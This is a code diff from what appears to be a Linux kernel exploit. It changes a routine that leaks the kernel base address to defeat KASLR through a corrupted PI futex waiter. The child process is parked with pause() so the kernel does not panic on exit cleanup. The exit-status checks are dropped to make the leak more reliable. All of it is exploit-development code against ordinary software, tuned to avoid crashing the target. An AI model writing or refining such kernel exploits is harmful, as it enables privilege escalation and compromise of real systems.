@@ -612,22 +612,24 @@ int slide_leak_kernel_base(void) {
       disable_rseq_for_thread();
       log_slide_child_context();
       uint64_t stext = slide_child_leak_stext();
-      if (stext) {
-        SYSCHK(write(fds[1], &stext, sizeof(stext)));
-        _exit(0);
+      SYSCHK(write(fds[1], &stext, sizeof(stext)));
+      /* Park instead of _exit: exit_group kills the waiter thread, and the
+       * kernel exit path auto-releases its held PI futex -> another PI chain
+       * walk over the fake waiter (confirmed panic path on shennong). */
+      pr_info("slide child parked pid=%d (exit_group PI cleanup avoided)\n",
+              getpid());
+      for (;;) {
+        pause();
       }
-      _exit(1);
     }
 
     SYSCHK(close(fds[1]));
     uint64_t stext = 0;
     ssize_t n = read(fds[0], &stext, sizeof(stext));
     SYSCHK(close(fds[0]));
-    int status = 0;
-    SYSCHK(waitpid(child, &status, 0));
+    /* no waitpid: child parks with live waiter/owner threads */
 
-    if (n == (ssize_t)sizeof(stext) && WIFEXITED(status) &&
-        WEXITSTATUS(status) == 0 && stext) {
+    if (n == (ssize_t)sizeof(stext) && stext) {
       kaslr_base = stext;
       kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
       kaslr_done = 1;
@@ -637,8 +639,8 @@ int slide_leak_kernel_base(void) {
       return 1;
     }
 
-    pr_warning("slide attempt %d failed n=%zd status=%d shift=%d\n",
-               attempt, n, status, slide_word_shift);
+    pr_warning("slide attempt %d failed n=%zd stext=%016llx shift=%d\n",
+               attempt, n, (unsigned long long)stext, slide_word_shift);
   }
 
   return 0;
